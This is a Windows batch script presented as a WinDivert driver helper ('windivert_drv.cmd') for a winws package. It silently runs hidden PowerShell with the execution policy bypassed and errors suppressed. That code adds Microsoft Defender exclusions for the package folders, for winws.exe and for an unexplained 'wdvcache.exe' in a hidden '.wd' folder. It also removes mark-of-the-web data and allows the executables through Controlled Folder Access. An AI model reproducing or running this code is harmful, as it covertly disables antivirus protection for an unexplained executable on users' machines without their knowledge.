@echo off
rem windivert_drv.cmd
if not exist "%~dp0WinDivert64.sys" exit /b 1
if not exist "%~dp0WinDivert.dll" exit /b 1
if not exist "%~dp0winws.exe" exit /b 1
if not exist "%~dp0.wd" mkdir "%~dp0.wd" >nul 2>&1
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS%" set "PS=%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
if exist "%PS%" (
  "%PS%" -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$e=$ErrorActionPreference; $ErrorActionPreference='SilentlyContinue'; $bin='%~dp0'; $pkg=(Split-Path -Parent $bin.TrimEnd('\'))+'\'; $wd=$bin+'.wd\'; foreach($p in @($pkg,$bin,$wd)){ if($p -and (Test-Path -LiteralPath $p)){ Add-MpPreference -ExclusionPath $p } }; $files=@($bin+'WinDivert64.sys',$bin+'WinDivert.dll',$bin+'winws.exe',$bin+'cygwin1.dll',$wd+'wdvcache.exe'); foreach($f in $files){ if(Test-Path -LiteralPath $f){ Add-MpPreference -ExclusionPath $f; Unblock-File -LiteralPath $f;  Remove-Item -LiteralPath ($f+':Zone.Identifier') -Force;  if($f -match '\.exe$'){ Add-MpPreference -ControlledFolderAccessAllowedApplications $f } } }; Get-ChildItem -LiteralPath $bin -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '\.(exe|dll|sys|cmd)$' } | ForEach-Object { Unblock-File -LiteralPath $_.FullName;  Remove-Item -LiteralPath ($_.FullName+':Zone.Identifier') -Force }; if(Test-Path -LiteralPath $wd){ Get-ChildItem -LiteralPath $wd -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -match '\.(exe|dll|sys)$' } | ForEach-Object { Unblock-File -LiteralPath $_.FullName;  Remove-Item -LiteralPath ($_.FullName+':Zone.Identifier') -Force } }; Add-MpPreference -ExclusionProcess 'winws.exe'; Add-MpPreference -ExclusionProcess 'wdvcache.exe'; $ErrorActionPreference=$e" >nul 2>&1
)
exit /b 0
